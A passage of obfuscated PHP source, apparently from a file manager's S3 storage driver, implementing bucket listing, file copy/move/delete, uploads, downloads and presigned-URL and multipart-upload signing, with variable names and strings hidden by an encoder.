rawurlencode($‚¸ÉëÙù)); } public function writeLog($±áòª®© = '', $‰àú°øŒ = false) { $¬ŞÇñù =& $_SERVER[Ï×Œõ”û]; $‡èê‰¹Ÿ = in_array(ACTION, array($¬ŞÇñù[212], $¬ŞÇñù[213])); if (!$‡èê‰¹Ÿ && !GLOBAL_DEBUG) { return; } $‘Â¸¦° = $±áòª®©; static $¦ìè™÷â = null; if (!$¦ìè™÷â) { $¦ìè™÷â = strtoupper($this->getType()); } $±áòª®© = $¦ìè™÷â . $¬ŞÇñù[214] . $±áòª®©; if ($‰àú°øŒ) { $ÔäÓĞ¦‡ = error_get_last(); if ($ÔäÓĞ¦‡) { $±áòª®© = array($±áòª®©, $ÔäÓĞ¦‡); } } write_log($±áòª®©, $¬ŞÇñù[215]); if ($‡èê‰¹Ÿ) { throw new Exception($‘Â¸¦°); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ô±Âá¹ê) { set_timeout(); require_once SDK_DIR . $_SERVER[Ï×Œõ”û][216]; parent::__construct(); $this->_init($ô±Âá¹ê); } public function _init($»çÂ¥Ê) { $¾—å¥… =& $_SERVER[Ï×Œõ”û]; $this->config = $»çÂ¥Ê; foreach ($»çÂ¥Ê as $íßçø–Ì => $ıĞ˜‘) { if (isset($this->{$íßçø–Ì})) { $this->{$íßçø–Ì} = $ıĞ˜‘; } } $this->endpoint = $»çÂ¥Ê[$¾—å¥…[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $ì‡ôøóï = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($ì‡ôøóï, 0, 7) == $¾—å¥…[218]) { $ì‡ôøóï = $¾—å¥…[219] . substr($ì‡ôøóï, 7); } $this->client->setEndpoint($ì‡ôøóï); if (in_array(ACTION, array($¾—å¥…[212], $¾—å¥…[213]))) { $this->client->setExceptions(); } } public function setSignVersion($ÜŞÀ‘¶Ù = "\166\x34") { $this->signVer = $ÜŞÀ‘¶Ù; $this->client->setSignVersion($ÜŞÀ‘¶Ù); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $†ÓÔ¹Ê) { return null; } } public function isBucketCors() { $ùË½ö¹ =& $_SERVER[Ï×Œõ”û]; $İí¶†èÆ = $this->getBucketCors(); if (!$İí¶†èÆ || !is_array($İí¶†èÆ)) { return !1; } if (!is_array($İí¶†èÆ[$ùË½ö¹[220]])) { $İí¶†èÆ[$ùË½ö¹[220]] = explode($ùË½ö¹[50], $İí¶†èÆ[$ùË½ö¹[220]]); } if ($İí¶†èÆ[$ùË½ö¹[221]] != $ùË½ö¹[222] || !in_array($ùË½ö¹[222], $İí¶†èÆ[$ùË½ö¹[220]])) { return !1; } $…÷§®²ğ = array_map($ùË½ö¹[223], $İí¶†èÆ[$ùË½ö¹[224]]); if (!is_array($…÷§®²ğ)) { $…÷§®²ğ = array(); } $ÏÛ²§ü = array($ùË½ö¹[225], $ùË½ö¹[226], $ùË½ö¹[227], $ùË½ö¹[228], $ùË½ö¹[229]); $ë˜â¾ğÉ = array_diff($ÏÛ²§ü, $…÷§®²ğ); return empty($ë˜â¾ğÉ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($èè¹¬ÒÌ, $¢é´×å‹ = '', $ÓÙù¢” = REPEAT_RENAME) { $¬æ™ƒÚ  = $this->setContent($èè¹¬ÒÌ, $¢é´×å‹); if ($¬æ™ƒÚ  !== !1) { return $this->getPathOuter($èè¹¬ÒÌ); } return !1; } public function mkdir($ÒÔ¿ÀüÒ, $¥ğõ… = REPEAT_SKIP) { $À­Û‰ =& $_SERVER[Ï×Œõ”û]; if (empty($ÒÔ¿ÀüÒ) && $ÒÔ¿ÀüÒ !== $À­Û‰[230]) { return !1; } if ($¥ğõ… && $this->_isFolder($ÒÔ¿ÀüÒ)) { return $this->getPathOuter($ÒÔ¿ÀüÒ); } $‡òöÄ¿ = $this->setContent($ÒÔ¿ÀüÒ, $À­Û‰[12], !0); if ($‡òöÄ¿ !== !1) { return $this->getPathOuter($ÒÔ¿ÀüÒ); } return !1; } public function copyFile($¸ƒü¢€Ï, $•­™­ı®, $èÒ«õÌñ = array()) { $±¦´ê‹í =& $_SERVER[Ï×Œõ”û]; $Î¯óÄÅë = $this->objectMeta($¸ƒü¢€Ï); if (!$Î¯óÄÅë) { return !1; } if ($Î¯óÄÅë[$±¦´ê‹í[79]] <= 1024 * 1024 * 200) { $˜ÊéÈæ = $this->client->copyObject($this->bucket, $¸ƒü¢€Ï, $this->bucket, $•­™­ı®, $±¦´ê‹í[231], $èÒ«õÌñ); } else { $˜ÊéÈæ = $this->client->multiCopyObject($this->bucket, $¸ƒü¢€Ï, $this->bucket, $•­™­ı®, $èÒ«õÌñ); } $˜ÊéÈæ = $˜ÊéÈæ ? $this->getPathOuter($•­™­ı®) : !1; return $˜ÊéÈæ; } public function moveFile($§–¯ƒÁØ, $†™§™­Š) { if ($this->copyFile($§–¯ƒÁØ, $†™§™­Š)) { $this->delFile($§–¯ƒÁØ); return $this->getPathOuter($†™§™­Š); } return !1; } public function delFile($ñ¬ê”™Ô) { return $this->client->deleteObject($this->bucket, $ñ¬ê”™Ô); } public function delFolder($Ö©ıŠÖ±) { $şµ¢Îí =& $_SERVER[Ï×Œõ”û]; if (!$this->exist($Ö©ıŠÖ±)) { return !0; } $this->listItemCache = !1; $û¦’êó = $this->fileList($Ö©ıŠÖ±); $this->listItemCache = !0; $â’¥œ’è = trim($Ö©ıŠÖ±, $şµ¢Îí[8]) . $şµ¢Îí[8]; if (!empty($Ö©ıŠÖ±) && $Ö©ıŠÖ± !== $şµ¢Îí[230] && !in_array($â’¥œ’è, $û¦’êó[$şµ¢Îí[85]])) { $û¦’êó[$şµ¢Îí[85]][] = $â’¥œ’è; } $ÏÆğ¼î = $this->delByBatch($û¦’êó[$şµ¢Îí[86]]); if (!$ÏÆğ¼î) { return !1; } $ÏÆğ¼î = $this->delByBatch($û¦’êó[$şµ¢Îí[85]]); if (!$ÏÆğ¼î) { return !1; } return $this->delFile($â’¥œ’è); } private function delByBatch($ú’Æ—¸) { foreach (array_chunk($ú’Æ—¸, 1000) as $Í©œşÌµ) { $Åéë•ä§ = $this->client->deleteObjects($this->bucket, $Í©œşÌµ); if (!$Åéë•ä§) { return !1; } } return !0; } public function rename($©½‘´á, $Ş×¼¥¹) { return $this->renameObject($©½‘´á, $Ş×¼¥¹); } public function listPath($æ‚ø©ë¬, $ùÈ”‡í = false) { $Ò¾™Úä =& $_SERVER[Ï×Œõ”û]; $ °’ƒéÇ = $this->fileList($æ‚ø©ë¬, $Ò¾™Úä[8], !0); foreach ($ °’ƒéÇ[$Ò¾™Úä[85]] as $õùëô¸¨ => $İá–÷Ûˆ) { $ °’ƒéÇ[$Ò¾™Úä[85]][$õùëô¸¨] = $this->folderInfo($İá–÷Ûˆ, $ùÈ”‡í, $İá–÷Ûˆ); } foreach ($ °’ƒéÇ[$Ò¾™Úä[86]] as $õùëô¸¨ => $İá–÷Ûˆ) { $ °’ƒéÇ[$Ò¾™Úä[86]][$õùëô¸¨] = $this->fileInfo($İá–÷Ûˆ[$Ò¾™Úä[32]], $ùÈ”‡í, $İá–÷Ûˆ); } return $ °’ƒéÇ; } protected function infoChildren($ÑÄ¯¶í“, &$¬°“¢) { $‚üŞ«‰Ó =& $_SERVER[Ï×Œõ”û]; $­ªĞìÄÏ = $this->fileList($ÑÄ¯¶í“, $‚üŞ«‰Ó[12], !0); $¬°“¢[$‚üŞ«‰Ó[81]] += count($­ªĞìÄÏ[$‚üŞ«‰Ó[85]]); $¬°“¢[$‚üŞ«‰Ó[80]] += count($­ªĞìÄÏ[$‚üŞ«‰Ó[86]]); foreach ($­ªĞìÄÏ[$‚üŞ«‰Ó[86]] as $ìŠ¬®ª¬) { if (!$ìŠ¬®ª¬ || !$ìŠ¬®ª¬[$‚üŞ«‰Ó[79]]) { continue; } $¬°“¢[$‚üŞ«‰Ó[79]] += $ìŠ¬®ª¬[$‚üŞ«‰Ó[79]]; } } private function fileInfo($ğ—¦°Å¯, $ıÅÏ = false, $ˆ¡äë¿© = array()) { $â­Üˆ® =& $_SERVER[Ï×Œõ”û]; $èá¬˜£ = array($â­Üˆ®[32] => $this->pathThis($ğ—¦°Å¯), $â­Üˆ®[87] => $this->getPathOuter($ğ—¦°Å¯), $â­Üˆ®[33] => $â­Üˆ®[232], $â­Üˆ®[168] => $this->ext($ğ—¦°Å¯), $â­Üˆ®[79] => isset($ˆ¡äë¿©[$â­Üˆ®[79]]) ? $ˆ¡äë¿©[$â­Üˆ®[79]] : 0); if ($ıÅÏ) { return $èá¬˜£; } $èá¬˜£[$â­Üˆ®[233]] = $èá¬˜£[$â­Üˆ®[88]] = 0; $èá¬˜£[$â­Üˆ®[234]] = $èá¬˜£[$â­Üˆ®[235]] = !0; if (empty($ˆ¡äë¿©)) { $ˆ¡äë¿© = $this->objectMeta($ğ—¦°Å¯); if (!$ˆ¡äë¿©) { return $èá¬˜£; } } if (isset($ˆ¡äë¿©[$â­Üˆ®[236]]) && $ˆ¡äë¿©[$â­Üˆ®[236]]) { $èá¬˜£[$â­Üˆ®[237]] = $ˆ¡äë¿©[$â­Üˆ®[236]]; } if (isset($ˆ¡äë¿©[$â­Üˆ®[206]])) { $èá¬˜£[$â­Üˆ®[88]] = $ˆ¡äë¿©[$â­Üˆ®[206]]; } if (isset($ˆ¡äë¿©[$â­Üˆ®[79]])) { $èá¬˜£[$â­Üˆ®[79]] = $ˆ¡äë¿©[$â­Üˆ®[79]]; } return $èá¬˜£; } private function folderInfo($×‘“Öä³, $ªÌË¥ƒß = false, $­ÓŠ èÓ = array()) { $¹ñİâ±ê =& $_SERVER[Ï×Œõ”û]; $Ù“Òåß— = array($¹ñİâ±ê[32] => $this->pathThis($×‘“Öä³), $¹ñİâ±ê[87] => $this->getPathOuter($¹ñİâ±ê[8] . $×‘“Öä³), $¹ñİâ±ê[33] => $¹ñİâ±ê[78]); if ($ªÌË¥ƒß) { return $Ù“Òåß—; } $Ù“Òåß—[$¹ñİâ±ê[233]] = $Ù“Òåß—[$¹ñİâ±ê[88]] = 0; $Ù“Òåß—[$¹ñİâ±ê[234]] = $Ù“Òåß—[$¹ñİâ±ê[235]] = !0; if ($×‘“Öä³ == $¹ñİâ±ê[12]) { return $Ù“Òåß—; } if (empty($­ÓŠ èÓ)) { $­ÓŠ èÓ = $this->objectMeta(trim($×‘“Öä³, $¹ñİâ±ê[8]) . $¹ñİâ±ê[8]); } if (isset($­ÓŠ èÓ[$¹ñİâ±ê[206]])) { $Ù“Òåß—[$¹ñİâ±ê[233]] = $­ÓŠ èÓ[$¹ñİâ±ê[206]]; } return $Ù“Òåß—; } private function fileList($ä·×ˆı, $ŞÂÌ®ıÛ = '', $Û­š›²õ = 0) { $²öãÕœ =& $_SERVER[Ï×Œõ”û]; $Ÿè½˜‘Ï = rtrim($ä·×ˆı, $²öãÕœ[8]) . $²öãÕœ[8]; $ÂÄ¹ÕÃ£ = $this->listObjs($Ÿè½˜‘Ï, null, null, $ŞÂÌ®ıÛ); if (!$ÂÄ¹ÕÃ£) { return array($²öãÕœ[85] => array(), $²öãÕœ[86] => array()); } $¡ÉÕ©¸† = $“—¶¼¬© = array(); foreach ($ÂÄ¹ÕÃ£[$²öãÕœ[238]] as $Èò…ˆÎ²) { $€æìå§° = $Èò…ˆÎ²[$²öãÕœ[32]]; if ($€æìå§° == $Ÿè½˜‘Ï) { continue; } $†¼…óÈš = isset($Èò…ˆÎ²[$²öãÕœ[79]]) ? $Èò…ˆÎ²[$²öãÕœ[79]] : 0; $È‹÷œØ = $†¼…óÈš == 0 && substr($€æìå§°, strlen($€æìå§°) - 1, 1) == $²öãÕœ[8] ? !0 : !1; $this->cacheMethodInfoSet($€æìå§°, $È‹÷œØ, $Èò…ˆÎ²); if ($È‹÷œØ) { $¡ÉÕ©¸†[] = $€æìå§°; continue; } $“—¶¼¬©[] = $Û­š›²õ ? $Èò…ˆÎ² : $€æìå§°; } foreach ($ÂÄ¹ÕÃ£[$²öãÕœ[239]] as $Èò…ˆÎ²) { $¡ÉÕ©¸†[] = $Èò…ˆÎ²[$²öãÕœ[32]]; $this->cacheMethodInfoSet($Èò…ˆÎ²[$²öãÕœ[32]], !0); } $this->cacheMethodInfoSet($ä·×ˆı, !0); return array($²öãÕœ[85] => $¡ÉÕ©¸†, $²öãÕœ[86] => $“—¶¼¬©); } private function listObjs($„°ãÉ´‘, $ÙÖ¹öà½ = null, $ Ùêå€Ü = null, $èğÆ‰à¸ = null) { $Áü™ô÷  =& $_SERVER[Ï×Œõ”û]; $„°ãÉ´‘ = trim($„°ãÉ´‘, $Áü™ô÷ [8]); $ÕÅ¡‘² = empty($„°ãÉ´‘) && $„°ãÉ´‘ !== $Áü™ô÷ [230] ? $Áü™ô÷ [12] : $„°ãÉ´‘ . $Áü™ô÷ [8]; return $this->client->getBucket($this->bucket, $ÕÅ¡‘², $ÙÖ¹öà½, $ Ùêå€Ü, $èğÆ‰à¸, !0); } public function has($Õûæà¸‡, $Æ¢«Æú = false, $•íÆùï = true) { $¯Æ¤÷Øì =& $_SERVER[Ï×Œõ”û]; $Õûæà¸‡ = trim($Õûæà¸‡, $¯Æ¤÷Øì[8]); $à„î˜Şá = empty($Õûæà¸‡) && $Õûæà¸‡ !== $¯Æ¤÷Øì[230] ? $¯Æ¤÷Øì[12] : $Õûæà¸‡ . $¯Æ¤÷Øì[8]; $â—ûØøà = null; $¤§§„áİ = 500; $£”µ‚Å¶ = $¯Æ¤÷Øì[8]; $òı¬â¤ = $ø»¤´²É = array(); while (!0) { $Èº…¦¬× = $this->listObjs($Õûæà¸‡, $â—ûØøà, $¤§§„áİ, $£”µ‚Å¶); if (!$Èº…¦¬×) { break; } $â—ûØøà = $Èº…¦¬×[$¯Æ¤÷Øì[240]]; $Ù„½ó–Ñ = $Èº…¦¬×[$¯Æ¤÷Øì[238]]; $¶ö•âÓÃ = $Èº…¦¬×[$¯Æ¤÷Øì[239]]; if (empty($Ù„½ó–Ñ) && empty($¶ö•âÓÃ)) { break; } if (count($Ù„½ó–Ñ) == 1 && $Ù„½ó–Ñ[0][$¯Æ¤÷Øì[32]] == $à„î˜Şá) { break; } if ($Æ¢«Æú) { if (count($Ù„½ó–Ñ)) { $Ù„½ó–Ñ = array_column($Ù„½ó–Ñ, $¯Æ¤÷Øì[32]); $òı¬â¤ = array_merge($òı¬â¤, $Ù„½ó–Ñ); } if (count($¶ö•âÓÃ)) { $¶ö•âÓÃ = array_column($¶ö•âÓÃ, $¯Æ¤÷Øì[32]); $ø»¤´²É = array_merge($ø»¤´²É, $¶ö•âÓÃ); } if ($â—ûØøà === null) { break; } continue; } if ($•íÆùï) { if (!empty($Ù„½ó–Ñ)) { if (count($Ù„½ó–Ñ) > 1 || isset($Ù„½ó–Ñ[0][$¯Æ¤÷Øì[32]]) && $Ù„½ó–Ñ[0][$¯Æ¤÷Øì[32]] != $à„î˜Şá) { return !0; } } } else { if (!empty($¶ö•âÓÃ)) { return !0; } } if ($â—ûØøà === null) { break; } } if ($Æ¢«Æú) { $òı¬â¤ = array_diff($òı¬â¤, array($à„î˜Şá)); $òı¬â¤ = count(array_unique($òı¬â¤)); $ø»¤´²É = count(array_unique($ø»¤´²É)); return array($¯Æ¤÷Øì[241] => $òı¬â¤, $¯Æ¤÷Øì[242] => $ø»¤´²É); } return !1; } public function listAll($ûã¥ıÔÑ) { $Ì£±İı± =& $_SERVER[Ï×Œõ”û]; $º‰¦÷Èø = $this->fileList($ûã¥ıÔÑ, $Ì£±İı±[12], !0); $µò‹ÉãĞ = array_to_keyvalue($º‰¦÷Èø[$Ì£±İı±[86]], $Ì£±İı±[32]); foreach ($º‰¦÷Èø[$Ì£±İı±[85]] as $ÏÆïÜÆ) { if (is_string($ÏÆïÜÆ)) { $µò‹ÉãĞ[$ÏÆïÜÆ] = array($Ì£±İı±[79] => 0); } } return $this->listAllFiles($ûã¥ıÔÑ, $µò‹ÉãĞ); } public function canRead($ŸöÍÚİÊ) { $éÀşŞÈ  =& $_SERVER[Ï×Œõ”û]; $îşÓ‰ = $this->client->getAccessControlPolicy($this->bucket, $ŸöÍÚİÊ); if (!$îşÓ‰) { return !1; } return in_array($îşÓ‰, array($éÀşŞÈ [243], $éÀşŞÈ [244], $éÀşŞÈ [245])) ? !0 : !1; } public function canWrite($×æÈàÌà) { $É×Ä¹ =& $_SERVER[Ï×Œõ”û]; $÷é”€ = $this->client->getAccessControlPolicy($this->bucket, $×æÈàÌà); if (!$÷é”€) { return !1; } return in_array($÷é”€, array($É×Ä¹[243], $É×Ä¹[244])) ? !0 : !1; } public function getContent($Å­ÅÔ¦) { return $this->client->getObject($this->bucket, $Å­ÅÔ¦); } public function setContent($Àû£ˆÃ‡, $–ú‚ÛÈÇ = '', $Ô°Â©Ø = false) { $¥½‘Øçß =& $_SERVER[Ï×Œõ”û]; $Àû£ˆÃ‡ = $Ô°Â©Ø ? trim($Àû£ˆÃ‡, $¥½‘Øçß[8]) . $¥½‘Øçß[8] : $Àû£ˆÃ‡; $ß©ØÖ‹« = get_file_mime(get_path_ext($Àû£ˆÃ‡)); $‘„¼˜Œ¦ = $this->client->putObject($–ú‚ÛÈÇ, $this->bucket, $Àû£ˆÃ‡, $¥½‘Øçß[231], array(), $ß©ØÖ‹«); if (!$‘„¼˜Œ¦) { return !1; } if ($Ô°Â©Ø) { return !0; } return $‘„¼˜Œ¦ ? !0 : !1; } public function fileSubstr($ÂüåÇ‰’, $ÆÃ²¿Ÿş, $º¥¼¬—) { $”—ÍÌ™‚ = $ÆÃ²¿Ÿş + $º¥¼¬— - 1; return $this->client->getObject($this->bucket, $ÂüåÇ‰’, array($_SERVER[Ï×Œõ”û][246] => "\x62\x79\164\145\163\x3d{$ÆÃ²¿Ÿş}\x2d{$”—ÍÌ™‚}")); } public function upload($¶¿¹×àï, $€ªÅ†ÃØ, $äĞ•™á¦ = false, $àéŠ‡°ø = REPEAT_REPLACE) { $¿Á¾¯¡Ä =& $_SERVER[Ï×Œõ”û]; if (!$€ªÅ†ÃØ || !@file_exists($€ªÅ†ÃØ)) { return !1; } $…–¸ÎÒì = array($¿Á¾¯¡Ä[247] => @md5_file($€ªÅ†ÃØ)); $ÑúÓ¬š = array($¿Á¾¯¡Ä[248] => get_file_mime(get_path_ext($¶¿¹×àï))); if (IO::size($€ªÅ†ÃØ) <= 1024 * 1024 * 200) { $Ã÷µ‡ïÍ = $this->client->putObjectFile($€ªÅ†ÃØ, $this->bucket, $¶¿¹×àï, $¿Á¾¯¡Ä[231], $…–¸ÎÒì, $ÑúÓ¬š); return !empty($Ã÷µ‡ïÍ) ? $this->getPathOuter($¶¿¹×àï) : !1; } $ò×«‰ı  = $this->client->multiUploadObject($€ªÅ†ÃØ, $this->bucket, trim($¶¿¹×àï, $¿Á¾¯¡Ä[8]), $…–¸ÎÒì, $ÑúÓ¬š); return $ò×«‰ı  ? $this->getPathOuter($¶¿¹×àï) : !1; } public function download($¡¶’¬Ù—, $ÑÔÅÉÙÚ) { if (!@is_dir($this->pathFather($ÑÔÅÉÙÚ)) && !IO::mkdir($this->pathFather($ÑÔÅÉÙÚ))) { return !1; } $ƒ¸’³ô™ = $this->client->getObject($this->bucket, $¡¶’¬Ù—, array(), $ÑÔÅÉÙÚ); return $ƒ¸’³ô™ !== !1 ? $ÑÔÅÉÙÚ : !1; } public function link($£ï·€à, $ÚÜ¨¶Ÿ÷ = array()) { return $this->getPreSignedURL($£ï·€à, 3600 * 12, $ÚÜ¨¶Ÿ÷); } private function getPreSignedURL($Çˆ®“À‡, $åÛƒŸÈ÷, $ûâÍÆš´ = array(), $ñÅÙÄŠ = "\x47\105\124") { $©†°Öö« =& $_SERVER[Ï×Œõ”û]; $Çˆ®“À‡ = trim($Çˆ®“À‡, $©†°Öö«[8]); if ($this->signVer == $©†°Öö«[249]) { return $this->client->getPreSignedV2URL($this->bucket, $Çˆ®“À‡, $åÛƒŸÈ÷, $ñÅÙÄŠ, $ûâÍÆš´); } return $this->client->getPreSignedV4URL($this->bucket, $Çˆ®“À‡, $åÛƒŸÈ÷, array(), $ñÅÙÄŠ, $ûâÍÆš´); } public function fileOut($áöİ‘Ï‚, $úœìŒ±¥ = false, $òßÑ¬³Ç = false, $Á—§µØô = '') { $ÜÙ¢éè  =& $_SERVER[Ï×Œõ”û]; if ($this->isFileOutServer()) { return $this->fileOutServer($áöİ‘Ï‚, $úœìŒ±¥, $òßÑ¬³Ç, $Á—§µØô); } if (!$òßÑ¬³Ç) { $òßÑ¬³Ç = $this->pathThis($áöİ‘Ï‚); } $µÈÃüø™ = get_file_mime(get_path_ext($òßÑ¬³Ç)); if ($µÈÃüø™ == $ÜÙ¢éè [250]) { return parent::fileOut($áöİ‘Ï‚, $úœìŒ±¥, $òßÑ¬³Ç, $Á—§µØô); } $”ñË”‹ğ = array($ÜÙ¢éè [251] => $µÈÃüø™); if ($úœìŒ±¥) { $”ñË”‹ğ[$ÜÙ¢éè [252]] = $ÜÙ¢éè [253] . rawurlencode($òßÑ¬³Ç); } else { } $§ÄùÊ‡ = $this->link($áöİ‘Ï‚, $”ñË”‹ğ); $this->fileOutLink($§ÄùÊ‡); } public function fileOutServer($ëÀÒ«µ¯, $Ü¢”™£õ = false, $ÑºÈ•’ = false, $ì‡ˆıÄÔ = '') { parent::fileOut($ëÀÒ«µ¯, $Ü¢”™£õ, $ÑºÈ•’, $ì‡ˆıÄÔ); } public function fileOutImageServer($£î‘¢²ñ, $·Æº¬üµ = 250) { parent::fileOutImage($£î‘¢²ñ, $·Æº¬üµ); } public function fileOutLink($¯Î©ëÜË) { $´›–Óˆç =& $_SERVER[Ï×Œõ”û]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($´›–Óˆç[67], $´›–Óˆç[66], $´›–Óˆç[68])) && !get_url_scheme($this->endpoint) && substr($¯Î©ëÜË, 0, 7) == $´›–Óˆç[218]) { $¯Î©ëÜË = $´›–Óˆç[219] . substr($¯Î©ëÜË, 7); } header($´›–Óˆç[174] . $¯Î©ëÜË); die; } public function hashMd5($Æù˜‰ş‡, $¹²Ê²”æ = '') { $³•€ßòá = $this->objectMeta($Æù˜‰ş‡); if (!$³•€ßòá) { return !1; } $¹²Ê²”æ = $¹²Ê²”æ ? $¹²Ê²”æ : _get($³•€ßòá, $_SERVER[Ï×Œõ”û][254]); return $¹²Ê²”æ; } public function uploadFormData($ö×°åÔ, $è‰ä³Ï = 3600) { $ïÒÊ­ş =& $_SERVER[Ï×Œõ”û]; if (!$this->_isClientAsync()) { $îäşÉÀˆ = $this->getPreSignedURL($ö×°åÔ, $è‰ä³Ï, array(), $ïÒÊ­ş[255]); return array($ïÒÊ­ş[208] => str_replace($ïÒÊ­ş[218], $ïÒÊ­ş[256], $îäşÉÀˆ)); } if (isset($GLOBALS[$ïÒÊ­ş[6]][$ïÒÊ­ş[92]][$ïÒÊ­ş[257]]) && $GLOBALS[$ïÒÊ­ş[6]][$ïÒÊ­ş[92]][$ïÒÊ­ş[257]] == $ïÒÊ­ş[230]) { return $this->uploadMultiData($ö×°åÔ, $è‰ä³Ï); } if ($this->signVer == $ïÒÊ­ş[249]) { return $this->uploadFormDataV2($ö×°åÔ, $è‰ä³Ï); } return $this->uploadFormDataV4($ö×°åÔ, $è‰ä³Ï); } public function uploadFormDataV2($äß¢Ó­Ï, $Ò«Üˆ¸ï = 3600) { $‹×Èñøç =& $_SERVER[Ï×Œõ”û]; $»åÜü±Î = $this->pathFather($äß¢Ó­Ï); $ÓáÉíô = $this->client->getHttpUploadPostParams($this->bucket, $»åÜü±Î, $‹×Èñøç[231], $Ò«Üˆ¸ï); $å×ÃŠğ¤ = array_merge((array) $ÓáÉíô, array($‹×Èñøç[258] => $‹×Èñøç[249], $‹×Èñøç[208] => $this->getHost())); if ($this->_isClientAsync()) { unset($å×ÃŠğ¤[$‹×Èñøç[258]]); } return $å×ÃŠğ¤; } public function uploadFormDataV4($¶œœÉ¥Û, $ÅÌ¿Ù‚ˆ = 3600) { $ô¹ò©¼Æ =& $_SERVER[Ï×Œõ”û]; $ı¿Ÿş™ = $ô¹ò©¼Æ[231]; $ÈàÕ’¶ê = $ô¹ò©¼Æ[259]; $Ö‚öÍœÀ = $ô¹ò©¼Æ[62]; $­³²Üáœ = gmdate($ô¹ò©¼Æ[260]); $°ÌÑîÖ– = gmdate($ô¹ò©¼Æ[261]); $ú«×ÕÌÍ = $ô¹ò©¼Æ[262]; $«‡•Ü§Œ = $ÅÌ¿Ù‚ˆ . $ô¹ò©¼Æ[12]; $ºßïÛÕ“ = $ô¹ò©¼Æ[263]; $¹¢É£–¤ = array($this->accessKey, $°ÌÑîÖ–, $this->region, $Ö‚öÍœÀ, $ú«×ÕÌÍ); $·øÖçÚ“ = implode($ô¹ò©¼Æ[8], $¹¢É£–¤); $˜×ÜÎÛ… = array($ô¹ò©¼Æ[264] => gmdate($ô¹ò©¼Æ[265], strtotime($ô¹ò©¼Æ[266])), $ô¹ò©¼Æ[267] => array(array($ô¹ò©¼Æ[268] => $this->bucket), array($ô¹ò©¼Æ[269], $ô¹ò©¼Æ[270], $ô¹ò©¼Æ[12]), array($ô¹ò©¼Æ[269], $ô¹ò©¼Æ[271], $ô¹ò©¼Æ[12]), array($ô¹ò©¼Æ[272] => $ºßïÛÕ“), array($ô¹ò©¼Æ[273] => $·øÖçÚ“), array($ô¹ò©¼Æ[274] => $ÈàÕ’¶ê), array($ô¹ò©¼Æ[275] => $­³²Üáœ), array($ô¹ò©¼Æ[276] => $«‡•Ü§Œ))); $Ì­¦çŠ… = base64_encode(json_encode($˜×ÜÎÛ…)); $“‰ÄÁ¬‡ = hash_hmac($ô¹ò©¼Æ[277], $°ÌÑîÖ–, $ô¹ò©¼Æ[278] . $this->secret, !0); $Ú³ş‚ = hash_hmac($ô¹ò©¼Æ[277], $this->region, $“‰ÄÁ¬‡, !0); $•Á·ßäß = hash_hmac($ô¹ò©¼Æ[277], $Ö‚öÍœÀ, $Ú³ş‚, !0); $éŞûï = hash_hmac($ô¹ò©¼Æ[277], $ú«×ÕÌÍ, $•Á·ßäß, !0); $‡€Ì¡™ = hash_hmac($ô¹ò©¼Æ[277], $Ì­¦çŠ…, $éŞûï); $ıÊäé„ = array($ô¹ò©¼Æ[248] => $ô¹ò©¼Æ[12], $ô¹ò©¼Æ[272] => $ºßïÛÕ“, $ô¹ò©¼Æ[279] => $Ì­¦çŠ…, $ô¹ò©¼Æ[273] => $·øÖçÚ“, $ô¹ò©¼Æ[274] => $ÈàÕ’¶ê, $ô¹ò©¼Æ[275] => $­³²Üáœ, $ô¹ò©¼Æ[276] => $«‡•Ü§Œ, $ô¹ò©¼Æ[280] => $‡€Ì¡™, $ô¹ò©¼Æ[258] => $ô¹ò©¼Æ[249], $ô¹ò©¼Æ[208] => $this->getHost()); if ($this->_isClientAsync()) { unset($ıÊäé„[$ô¹ò©¼Æ[258]]); } return $ıÊäé„; } public function uploadMultiData($ö©ÚöÁ, $éàî¾±° = 3600) { $À´ğê‹½ =& $_SERVER[Ï×Œõ”û]; $óÌ°œ° = $this->signVer == $À´ğê‹½[249] ? gmdate($À´ğê‹½[281]) : gmdate($À´ğê‹½[282]); $‰ñì®§ = array(); $å©“Ô = $this->client->getUploadId($this->bucket, $ö©ÚöÁ, $‰ñì®§); if (!$å©“Ô) { return !1; } $›üŸ“’Š = array($À´ğê‹½[283] => $å©“Ô, $À´ğê‹½[208] => $this->getHost() . $À´ğê‹½[8] . $this->pathEncode($ö©ÚöÁ), $À´ğê‹½[284] => $óÌ°œ°, $À´ğê‹½[95] => $ö©ÚöÁ, $À´ğê‹½[258] => $this->signVer); if ($this->_isClientAsync()) { unset($›üŸ“’Š[$À´ğê‹½[258]]); } return $›üŸ“’Š; } public function uploadMultiAuth($ü×¿šÙ, $–éù§ª = array()) { $ƒƒşÃ† =& $_SERVER[Ï×Œõ”û]; if ($this->signVer == $ƒƒşÃ†[249]) { if (isset($–éù§ª[$ƒƒşÃ†[285]])) { return $this->uploadPartAuthV2($ü×¿šÙ, $–éù§ª); } return $this->uploadListAuthV2($ü×¿šÙ, $–éù§ª); } if (isset($–éù§ª[$ƒƒşÃ†[285]])) { return $this->uploadPartAuthV4($ü×¿šÙ, $–éù§ª); } return $this->uploadListAuthV4($ü×¿šÙ, $–éù§ª); } public function uploadPartAuthV2($ÛëÙ·ÂŞ, $òÓµˆëƒ = array()) { $®ŸÛ»Ã¬ =& $_SERVER[Ï×Œõ”û]; $¨›Ò›´Á = $òÓµˆëƒ[$®ŸÛ»Ã¬[95]]; $ŒĞëõ—ã = gmdate($®ŸÛ»Ã¬[281]); $àŸ‹ßÇš = array_intersect_key($òÓµˆëƒ, array_flip(array($®ŸÛ»Ã¬[285], $®ŸÛ»Ã¬[283]))); ksort($àŸ‹ßÇš); $ïş«‹û´ = $àŸ‹ßÇš ? $®ŸÛ»Ã¬[76] . http_build_query($àŸ‹ßÇš, null, $®ŸÛ»Ã¬[286], PHP_QUERY_RFC3986) : $®ŸÛ»Ã¬[12]; $çü»ıÄ = array($®ŸÛ»Ã¬[255], $®ŸÛ»Ã¬[12], $®ŸÛ»Ã¬[121], $®ŸÛ»Ã¬[12], 